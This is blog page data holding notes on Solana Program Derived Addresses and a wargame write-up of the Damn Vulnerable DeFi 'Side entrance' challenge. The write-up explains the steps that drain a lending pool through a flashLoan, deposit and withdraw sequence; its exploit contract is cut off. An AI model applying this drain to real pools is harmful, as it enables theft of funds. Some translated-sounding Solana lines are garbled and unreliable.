{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/solana-chain-Program-Derived-Address/",
    "result": {"data":{"cur":{"id":"fc4d4dd2-dc42-5b81-80e1-137c9a66d098","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACh0lEQVQoz2WR3UuTcRTHz7Pn2UvMbc69OB+1kTnNNR1WtlZmNRMzMcllmk2XMxZlUVK6sldCeoOIUAShF8sICYLoMrDLrqKLbgv6N7r7xPNMLeji/M45v9/5fTjfc0TRyhHR0APN7PcN0+4fJKH30V6eoSuUpTOUocl7EK9tI5WuOI2xXipCMco31FO5o5Vw8gCauBDFjqIFEYs1hIiD2tYeTo0vM5F4z1T8A/mGl2Rr55lu+MhEdJFqbwvJLaP0bX1AdNMhEp4MHmcEa0kFonhQVC+iBhGzQ0sA1VlFPD9Oz4150oXnDFxYZKR3ice7f3Et9omWyDA3b3zj/p2f7Kod4Xj1IxQtgCg+DIaiBk0Tg2pClQAibsQaQDx+ssfeMJleIRtdZCr+hYG6p6QLCzz58ZujyRk6gpcR1YNFqyj+N6AmxzgMqDWExaGj2nVzBF25e0y//k6ue4nrO78SLknh0mNkP68wMLaA19KIWH1oNh1zbGuN/Q3KEHGhiB9R/Ijmp+VCgT2pSexSi4gTER+iBJENlYiUFOuMhYiXtcZkDeaq2oF/6CS2VBKrXWfb9nYCvgj10QR10QQl7hrszmpiTW1sDDejVzfhKq2hMb6PqnDchBclm1t2E6kbovXuW9zDgwQD9czNv6AwPcPZ8QK3bj9kcChPLN7G4qtlZuee8fDRrHlv5FNX767LFosWQhQ3dd4jnNj7jkhqHLurivyZK4ycOk9m5Bzp/hy505foOzZKcs9henozdHT2Mzp2kQPtR9nd2o3Vof8jWQ1is4Vx2DejqsZDYHU+nlVfVrT1mXkQKV317mL831IMiGoso5gbZshY8xZr8U61VazmRVNtofU6o8M/13ROJi18q2AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"sol.png\"\n        title=\"sol.png\"\n        src=\"/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png\"\n        srcset=\"/static/42c50aa129dde452dfcc4a7375ec7765/e9ff0/sol.png 180w,\n/static/42c50aa129dde452dfcc4a7375ec7765/f21e7/sol.png 360w,\n/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png 720w,\n/static/42c50aa129dde452dfcc4a7375ec7765/302a4/sol.png 1080w,\n/static/42c50aa129dde452dfcc4a7375ec7765/07a9c/sol.png 1440w,\n/static/42c50aa129dde452dfcc4a7375ec7765/29114/sol.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"program-derived-address\" style=\"position:relative;\"><a href=\"#program-derived-address\" aria-label=\"program derived address permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Program Derived Address</h2>\n<ul>\n<li>PDA is the home of an account designed to be controlled by a specific program.</li>\n<li>A PDA allows a program to sign a specific address programmatically without the need for a private key.</li>\n<li>Serves as the basis for cross-program calls, which allows Solana apps to configure with each other.</li>\n<li>A 32-byte string that looks like a public key, but doesn‚Äôt have a corresponding private key</li>\n<li>Deterministically derive the PDA from findProgramAddress programID, Seed(collections of bytes).</li>\n<li>bump(1byte) is used to push the potential PDA out of the ed25519 elliptic curve.</li>\n<li>Program can sign PDA by providing seed and bump to invoke_signed.</li>\n<li>A PDA can only be signed by a derived program.</li>\n<li>In addition to allowing the program to sign other commands, the PDA also provides an interface such as a hashmap for indexing accounts.</li>\n<li>PDA is an essential building block for developing programs in Solana.</li>\n<li>Allows programs to sign accounts while preventing external users from creating valid signatures for the same account.</li>\n<li>In addition to signing an account, certain programs may modify the account on the PDA.</li>\n</ul>\n<h2 id=\"create-pda\" style=\"position:relative;\"><a href=\"#create-pda\" aria-label=\"create pda permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Create PDA</h2>\n<ul>\n<li>To understand the concept behind PDA, it can be helpful to consider that PDA is technically discovered rather than created.</li>\n<li>The PDA executes the combination of the seed (e.g string ‚Äúvote_account‚Äù) and programID through the sha256 hash function to check whether it generates the public key in the ed25519 elliptic curve.</li>\n<li>When executing programID , seed via a hash function, there is a ~50% chance of actually having a valid public key in an elliptic curve.</li>\n<li>In this case, all you need to do is change the input slightly and add something to try again.</li>\n<li>The technical term for this fuzzy vector is bump.</li>\n<li>In Solana we start with (bump = 255) and repeat (bump=254, bump=253) and so on until we get an address that is not in the elliptic curve.It may seem rudimentary, but once discovered it provides a deterministic counter-measure that continues to lead to the same PDA.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACHElEQVQoz42SzU4TURiGT2c6M6Ud2lKgFtsZpjOlFJwWKkQxFAhIkUhrCGIUCIaFEQILSZSN6AbvwItg5cKdd+AduJGEhTExhot4TM8IlqCJi/e85+97znfOd4RlTZKzJrHtKczEMGayxGJjk/riOvebW9RmVll5tM3yyjNm5x8zPtFgenaV2syK3Kvo/YQjeVTDkRIt4Dl0sLhA+UaT3vQ4QvQhRBohugIpOYRqIdQcImzJcQtwDmt5S0KoWS6kWRjRAp53l5Fyk0SqQtZ+SHd6nkxulEp1gSF/juFyoFa/UJqS7o/WyWRvIrSISzjiEnhwmgj1kUz5PGh+YPPpd9bWT3C8LYSaQevwUAwHM+ZgdDiXspSxQaouf9xFNSyMWJXtnROOjk55/eYHy0vHZOJZOk2XhJmnJ5FHk6BWXNuVgyaDouekq4b9e4NHo/mRF/tn7O79xK+8RAlfk/PtGV15w5B2Ha/4nPmFT9yaeI8WG0bo/YR0C6OzStk/oHbnLUasSEi3rwDa+xKY7J7iydoX9ve/sb1zxsTYIdFILyOVOZz8GJoSp1iYpru3KovWHvw3iVR6jo2Nr7w6OGV374za7XdEjR5M0yMWc9EjDqmeKgMDdfkTtIv3/gcwpOfwRw5ZanxmZvaYaGJMZqIYLoqRR2g28S6fodJiAOxwLxXhCjAodR/RuI9q9MviBItBUEizSXT5lAbv/RfwF255NAqUvut0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Ed2559-EC\"\n        title=\"Ed2559-EC\"\n        src=\"/static/4cda8c995a25614933e39f346a50a383/37523/Ed2559-EC.png\"\n        srcset=\"/static/4cda8c995a25614933e39f346a50a383/e9ff0/Ed2559-EC.png 180w,\n/static/4cda8c995a25614933e39f346a50a383/f21e7/Ed2559-EC.png 360w,\n/static/4cda8c995a25614933e39f346a50a383/37523/Ed2559-EC.png 720w,\n/static/4cda8c995a25614933e39f346a50a383/302a4/Ed2559-EC.png 1080w,\n/static/4cda8c995a25614933e39f346a50a383/07a9c/Ed2559-EC.png 1440w,\n/static/4cda8c995a25614933e39f346a50a383/29114/Ed2559-EC.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"pda-interaction\" style=\"position:relative;\"><a href=\"#pda-interaction\" aria-label=\"pda interaction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PDA Interaction</h2>\n<ul>\n<li>When the PDA is created, it returns both the findProgramAddress address and the bump used to start the address on the elliptic curve.</li>\n<li>A program armed with this conflict can sign any command that requires a PDA.</li>\n<li>The program for signing invoke_signed the Seed and Bump used to derive the Instrument, Account List, and PDA</li>\n<li>In addition to signing the instrument, the PDA must also sign its own creation via invoke_signed.</li>\n<li>When building with PDA, it is common to save bump and seed.</li>\n<li>In the account data itself, this allows the developer to easily validate the PDA without the need to pass bumps to instruction parms.</li>\n</ul>\n<h2 id=\"other-resources\" style=\"position:relative;\"><a href=\"#other-resources\" aria-label=\"other resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Resources</h2>\n<ul>\n<li><a href=\"https://www.brianfriel.xyz/understanding-program-derived-addresses/\">PDA</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#program-derived-address\">Program Derived Address</a></li>\n<li><a href=\"#create-pda\">Create PDA</a></li>\n<li><a href=\"#pda-interaction\">PDA Interaction</a></li>\n<li><a href=\"#other-resources\">Other Resources</a></li>\n</ul>\n</div>","excerpt":"Program Derived Address PDA is the home of an account designed to be controlled by a specific program. A PDA allows a program to sign a specific address programmatically without the need for a private key. Serves as the basis for cross-program calls, which allows Solana apps to configure with each other. A 32-byte string that looks like a public key, but doesn‚Äôt have a corresponding private key Deterministically derive the PDA from findProgramAddress programID, Seed(collections of bytes). bump(‚Ä¶","frontmatter":{"date":"July 31, 2022","title":"Solana Chain analysis Program Derived Address","categories":"Solana","author":"Zer0Luck","emoji":"üåû"},"fields":{"slug":"/solana-chain-Program-Derived-Address/"}},"next":{"id":"a01aab9f-e080-5ff9-96b1-69fd595a5201","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACgklEQVQoz1WRy2vTcADHf8076bK26WtL0iS/pG0Wu67r1lfarl3XbK61bl3ZqkPn6jarMhTnwQeCCCLowBdevHjz4EUPoqID0YteJvgEERTRg+DRf0Ckzovw4Xv7fA/fL7hycGczl3dwRpezj3UZrMtwuCOenhjni3p6Bjlf1OWNurz9nC/q9sec7m19qanF87cm2udUqwUUQfe6giihIISMEIoNlwhG4wMJvzAUgJkATPeKw71iQpBTsmbyUiKarDWOXJg+dsmYPQ5sfzWMgjitYhQkaBWnIE5BjFJYpyHISVkzZc2UYFoN5WTVVEO5aHoqVWkFi/MApVXcEUGJIMAl1B4GqARwuZOIAFCxg01A8E47yWg4BW02HqMgRquMQweGWW8sn7QmV2KZeqHenqguF3cslba3SuWmma9nR2bGJ/dEBsoYBQHopSglFbcwSkZJSHeFgBqvNPauTVYPDGUbY/WVgrVgzbStSiuTm44nKqKS0sJ5p6efYUM6TFUrq1/efJdhASA86zSAYJTM6mKy0IwmauHsnBK2sqPzw+laLF7mpSSCSzZEADbexyc/PXiyee/dy6e/V9s3EVIhmSBwSCanj3vk0W5vklUtj5D3BouiVnB7IyipYJRKMBpKKnZuYGF5ff3i4xtXX51eu93DpwEeAIf2nTpx9PJsbU1QR91GhYclvz6m6GWn22C6QygJO/NQkGA0vzgSG9xVzLdSw03OPWSnY+Dns/e/Xnz7cPft4YWzYrjs8MRpto9mwwSj4vQ/c4utC1l7QurePeA6k+Gug807G18fvf6x8fn+tYe6WgSYiFEKSioo9Z+JURAlIeMIRwL754LPl/SPdXnjD9Uyf5VnRCIaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"the-side-entrance-contract\"\n        title=\"the-side-entrance-contract\"\n        src=\"/static/a3cc9519cd6945ba181c32b7c2da3f97/37523/c4.png\"\n        srcset=\"/static/a3cc9519cd6945ba181c32b7c2da3f97/e9ff0/c4.png 180w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/f21e7/c4.png 360w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/37523/c4.png 720w,\n/static/a3cc9519cd6945ba181c32b7c2da3f97/e996b/c4.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #4 ‚Äî Side entrance</p>\n</blockquote>\n<p>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>SideEntranceLenderPool.sol</p>\n</blockquote>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>The address contract of the openzeppelin library is used as a dependency.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">mapping (address=>uint256) private balances</code></p>\n<ul>\n<li>It is used for flash Loan Pool management and cannot be accessed from outside because it is a private access indicator.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">fuction deposit() external payable</code></p>\n<ul>\n<li>You can see that the <code class=\"language-text\">msg.value</code> value is filled in for each address of <code class=\"language-text\">msg.sender</code> as a key value in the state variable balances mapping. Anyone from the outside can call this function to populate the balances mapping with a payable directive, making <code class=\"language-text\">ether</code> tradable.</li>\n</ul>\n<p><code class=\"language-text\">function withdraw() external</code></p>\n<ul>\n<li>In the state variable balances mapping, the value is extracted based on the corresponding <code class=\"language-text\">msg.sender</code> key and assigned to the <code class=\"language-text\">amountToWithdraw</code> variable.</li>\n<li>Logically, it is a logic configuration that allows withdrawal/withdrawal while managing the user‚Äôs balance through the balances variable.</li>\n<li>After temporarily matching the allocation of <code class=\"language-text\">amountToWithdraw</code>, a local variable, the <code class=\"language-text\">balances</code> mapping value of the address is initialized to 0.</li>\n<li>You can see that the value is passed to <code class=\"language-text\">msg.sender</code> while executing the last line of <code class=\"language-text\">payable(msg.sender).sendValue(amountToWithdraw).</code></li>\n</ul>\n<p>In this part, we use the sendValue method for sending ether . Let‚Äôs analyze it in depth. It is implemented as a method inside the <code class=\"language-text\">openzeppelin/&lt;->/Address.sol</code> module. As stated in the development specification, the call command is used to transmit ether on the internal logic. Basically, each method transfer, send, call is used to send ether.</p>\n<h3 id=\"the-big-differences-are\" style=\"position:relative;\"><a href=\"#the-big-differences-are\" aria-label=\"the big differences are permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The big differences are:</h3>\n<ul>\n<li>\n<p>transfer : Consumes 2300 gas, and an error occurs in case of failure</p>\n</li>\n<li>\n<p>send : consumes 2300 gas, returns true or false whether success or not</p>\n</li>\n<li>\n<p>call : Consuming variable gas and receiving <code class=\"language-text\">_to</code> Ether. Use the form <code class=\"language-text\">_to.call{value: msg.value, gas:}(‚Äù‚Äù).</code> Gas is unspecified due to reentrancy attack.</p>\n</li>\n</ul>\n<p>If the SLOAD operation consumes 5000 gas, transfer, send cannot be used, so the call command is used.</p>\n<p>If the <code class=\"language-text\">SLOAD</code> operation consumes 5000 gas, <code class=\"language-text\">transfer, send</code> cannot be used, so the <code class=\"language-text\">call</code> command is used.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// **OMIT**</span>\n<span class=\"token comment\">/**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> recipient<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: insufficient balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> recipient<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>value<span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Address: unable to send value, recipient may have reverted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// **OMIT**</span></code></pre></div>\n<p><code class=\"language-text\">function flashLoan(uint256 amount) external</code></p>\n<p>‚úÖ After allocating the ether value of the current contract to the value of the <code class=\"language-text\">amount</code> variable received as a parameter and the local variable <code class=\"language-text\">balanceBefore</code>, check whether the loan can be proceeded by comparison.</p>\n<ul>\n<li>Call the <code class=\"language-text\">execute</code> function defined in the <code class=\"language-text\">IFlashLoanEtherReceiver(msg.sender).execute{value: amount}()</code> Interface. In this case, the <code class=\"language-text\">amount</code> variable received as a parameter is used for the <code class=\"language-text\">value</code> property value. However, the <code class=\"language-text\">execute</code> function is not implemented internally, so it does not perform specific handling.</li>\n</ul>\n<p>‚úÖ At the end of the flash Loan logic, it is determined whether the loan has been properly collected.</p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>vulnerability</h2>\n<p>It could be seen that the flash Loan logic was not implemented properly. Because handling is not implemented, it does not work properly, and if an attacker triggers by deploying a contract that arbitrarily implements the <code class=\"language-text\">execute</code> function, an attack outside of the actual logic is possible.</p>\n<p>Next, the <code class=\"language-text\">deposit/withdraw</code> functions can control the <code class=\"language-text\">balances</code> mapping value in a form that anyone can use externally. At this time, by applying the <code class=\"language-text\">payable(msg.sender).sendValue(‚Ä¶)</code> pattern implemented in the <code class=\"language-text\">withdraw</code> function, the attacker can become a medium through which ether can be delivered to the implemented contract.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<p>Build an exploit contract to handle the target contract. Since the <code class=\"language-text\">execute</code> function is called by calling the <code class=\"language-text\">flashLoan</code> function in the attack target logic, the <code class=\"language-text\">flashLoan</code> function is called first.</p>\n<ol>\n<li>\n<p><code class=\"language-text\">target.flashLoan(address(target).balance);</code> ‚Üê Because ether is actually stored as the target contract‚Äôs balance value, the value is passed, and when the execute function is executed, the value is converted to the target contract‚Äôs balance. Make settings.</p>\n</li>\n<li>\n<p>When jumping to the execute function address, internally, by depositing the value before the exploit contract address, it is saved in the ‚Äòbalances‚Äô mapping of the target contract. At this point, the address of the exploit contract distributed by the attacker is set as the key value, and the ether value of the SideEntranceLenderPool contract is set as the ‚Äúvalue‚Äù value.</p>\n</li>\n<li>\n<p>After returning the call, call <code class=\"language-text\">target.withdraw()</code> to extract the ether value assigned to the <code class=\"language-text\">balances</code> mapping and send the ether to the actual exploit contract address. (target contract <ether> ‚Üí exploit contract)</p>\n</li>\n<li>\n<p>Since we moved the ether, we steal all the balance by sending it again to the attacker‚Äôs address.</p>\n</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token 